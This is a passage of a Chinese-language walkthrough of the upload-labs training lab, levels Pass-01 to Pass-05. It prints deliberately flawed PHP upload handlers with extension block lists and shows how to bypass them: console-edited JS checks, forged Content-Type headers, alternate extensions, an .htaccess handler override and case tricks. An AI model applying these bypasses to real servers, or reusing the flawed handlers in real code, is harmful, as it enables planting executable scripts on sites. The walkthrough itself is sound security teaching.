class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="2-利用"><a href="#2-利用" class="headerlink" title="2. 利用"></a>2. 利用</h3><p>我们将上述代码允许修改成<code>.php</code>, 然后复制代码在<code>concole</code>执行， 执行如下图：</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103111418840.png" alt="image-20201103111418840"></p><p>然后我们上传php文件</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103111639392.png" alt="image-20201103111639392"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103111651040.png" alt="image-20201103111651040"></p><h2 id="Pass-02-MIME类型检查"><a href="#Pass-02-MIME类型检查" class="headerlink" title="Pass-02 MIME类型检查"></a>Pass-02 MIME类型检查</h2><h3 id="1-分析-1"><a href="#1-分析-1" class="headerlink" title="1. 分析"></a>1. 分析</h3><p>查看源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pass-02</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || ($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码第5行只对文件的<code>MIME</code>类型进行了检查，及只对http包头<code>Content-type</code>字段进行了校验</p><p>常见MIME类型</p><table><thead><tr><th align="left">类型</th><th align="left">描述</th><th align="left">典型示例</th></tr></thead><tbody><tr><td align="left"><code>text</code></td><td align="left">表明文件是普通文本，理论上是人类可读</td><td align="left"><code>text/plain</code>, <code>text/html</code>, <code>text/css, text/javascript</code></td></tr><tr><td align="left"><code>image</code></td><td align="left">表明是某种图像。不包括视频，但是动态图（比如动态gif）也使用image类型</td><td align="left"><code>image/gif</code>, <code>image/png</code>, <code>image/jpeg</code>, <code>image/bmp</code>, <code>image/webp</code>, <code>image/x-icon</code>, <code>image/vnd.microsoft.icon</code></td></tr><tr><td align="left"><code>audio</code></td><td align="left">表明是某种音频文件</td><td align="left"><code>audio/midi</code>, <code>audio/mpeg, audio/webm, audio/ogg, audio/wav</code></td></tr><tr><td align="left"><code>video</code></td><td align="left">表明是某种视频文件</td><td align="left"><code>video/webm</code>, <code>video/ogg</code></td></tr><tr><td align="left"><code>application</code></td><td align="left">表明是某种二进制数据</td><td align="left"><code>application/octet-stream</code>, <code>application/pkcs12</code>, <code>application/vnd.mspowerpoint</code>, <code>application/xhtml+xml</code>, <code>application/xml</code>, <code>application/pdf</code></td></tr></tbody></table><h3 id="2-利用-1"><a href="#2-利用-1" class="headerlink" title="2. 利用"></a>2. 利用</h3><p>因为代码只对<code>Content-type</code>字段进行了校验， 我们使用<code>burp</code>修改符号的类型即可绕过</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103112446651.png" alt="image-20201103112446651"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103112523478.png" alt="image-20201103112523478"></p><h2 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03 黑名单绕过"></a>Pass-03 黑名单绕过</h2><h3 id="1-分析-2"><a href="#1-分析-2" class="headerlink" title="1. 分析"></a>1. 分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pass-03</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>trim() 函数移除字符串两侧的空白字符或其他预定义字符</p><p>语法：<code>trim(string,charlist)</code></p></blockquote><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要检查的字符串。</td></tr><tr><td align="left"><em>charlist</em></td><td align="left">可选。规定从字符串中删除哪些字符。如果被省略，则移除以下所有字符：<br />“\0” - NULL”\t” <br />- 制表符”\n”<br /> - 换行”\x0B”<br /> - 垂直制表符”\r”<br /> - 回车” “<br /> - 空格</td></tr></tbody></table><blockquote><p>deldot(file_name);     //删除文件名末尾的点</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deldot</span>(<span class="params">$s</span>)</span>&#123;</span><br><span class="line"><span class="keyword">for</span>($i = strlen($s)<span class="number">-1</span>;$i&gt;<span class="number">0</span>;$i--)&#123;</span><br><span class="line">$c = substr($s,$i,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>($i == strlen($s)<span class="number">-1</span> <span class="keyword">and</span> $c != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($c != <span class="string">&#x27;.&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> substr($s,<span class="number">0</span>,$i+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>strrchr() 函数查找字符串在另一个字符串中最后一次出现的位置，并返回从该位置到字符串结尾的所有字符</p><p>语法：<code>strrchr(string,char)</code></p></blockquote><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要搜索的字符串。</td></tr><tr><td align="left"><em>char</em></td><td align="left">必需。规定要查找的字符。如果该参数是数字，则搜索匹配此数字的 ASCII 值的字符。</td></tr><tr><td align="left">返回值</td><td align="left">返回从某个字符串在另一个字符串中最后一次出现的位置到主字符串结尾的所有字符。</td></tr></tbody></table><blockquote><p>strtolower() 函数把字符串转换为小写</p></blockquote><blockquote><p>str_ireplace() 函数替换字符串中的一些字符（不区分大小写）。</p><p>该函数必须遵循下列规则：</p><ul><li>如果搜索的字符串是一个数组，那么它将返回一个数组。</li><li>如果搜索的字符串是一个数组，那么它将对数组中的每个元素进行查找和替换。</li><li>如果同时需要对数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余元素将用空字符串进行替换</li><li>如果是对一个数组进行查找，但只对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用</li></ul><p>语法：<code>str_ireplace(find,replace,string,count)</code></p></blockquote><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>find</em></td><td align="left">必需。规定要查找的值。</td></tr><tr><td align="left"><em>replace</em></td><td align="left">必需。规定替换 <em>find</em> 中的值的值。</td></tr><tr><td align="left"><em>string</em></td><td align="left">必需。规定被搜索的字符串。</td></tr><tr><td align="left"><em>count</em></td><td align="left">可选。一个变量，对替换数进行计数。</td></tr></tbody></table><p>不允许上传<code>.asp,.aspx,.php,.jsp</code>后缀文件，但是可以上传其他任意后缀</p><p>但是可以上传其他任意后缀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure><p>前提是apache的<code>httpd.conf</code>中有如下配置代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .phps .php5 .pht</span><br></pre></td></tr></table></figure><p>或者上传<code>.htaccess</code>文件,需要：</p><ul><li><p><code>mod_rewrite模块开启</code></p></li><li><p><code>AllowOverride All</code></p></li><li><p>文件内容如下：</p><ul><li><pre><code class="php">&lt;FilesMatch &quot;shell.jpg&quot;&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  - 此时上传&#96;shell.jpg&#96;文件即可被当作php来解析</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">AddType application&#x2F;x-httpd-php .jpg</span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ul><blockquote><p>所有<code>.jpg</code>文件会被解析成php文件</p></blockquote><p><font color="red">这里第15行代码，会给文件进行重命名，导致上传的<code>.htaccess</code>会变成<code>数字.htaccess</code></font></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103151931851.png" alt="image-20201103151931851"></p><p>我们用第一种方法</p><h3 id="2-利用-2"><a href="#2-利用-2" class="headerlink" title="2. 利用"></a>2. 利用</h3><p>上传后缀为<code>.php5</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103150159067.png" alt="image-20201103150159067"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103150206566.png" alt="image-20201103150206566"></p><h2 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04 .htaccess绕过"></a>Pass-04 .htaccess绕过</h2><h3 id="1-分析-3"><a href="#1-分析-3" class="headerlink" title="1. 分析"></a>1. 分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pass-04</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件不允许上传!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了各种罕见后缀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>);</span><br></pre></td></tr></table></figure><p>但是没有过滤<code>.htaccess</code>,上述代码跟第三题类似,代码分析参看Pass-03</p><h3 id="2-利用-3"><a href="#2-利用-3" class="headerlink" title="2. 利用"></a>2. 利用</h3><p>上传<code>.htaccess</code>文件，文件内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure><blockquote><p>将后缀<code>.jpg</code>的文件解释为php可执行文件</p></blockquote><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103151003690.png" alt="image-20201103151003690"></p><p>然后上传<code>phpinfo.jpg</code>, 内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103151024526.png" alt="image-20201103151024526"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103151036864.png" alt="image-20201103151036864"></p><h2 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 大小写绕过"></a>Pass-05 大小写绕过</h2><h3 id="1-分析-4"><a href="#1-分析-4" class="headerlink" title="1. 分析"></a>1. 分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Pass-05</span></span><br><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>禁用了罕见的一些后缀，以及<code>.htaccess</code>, 但是并没有将后缀转换成小写，这里没有<code>strtolower()</code>函数进行后缀处理，而禁用的后缀并没有包括<code>Php</code>后缀</p><blockquote><p> 注意：在Linux没有特殊配置的情况下，这种情况只有win可以，因为win会忽略大小写</p></blockquote><h3 id="2-利用-4"><a href="#2-利用-4" class="headerlink" title="2. 利用"></a>2. 利用</h3><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img/image-20201103152856438.png" alt="image-20201103152856438"></p><p><img 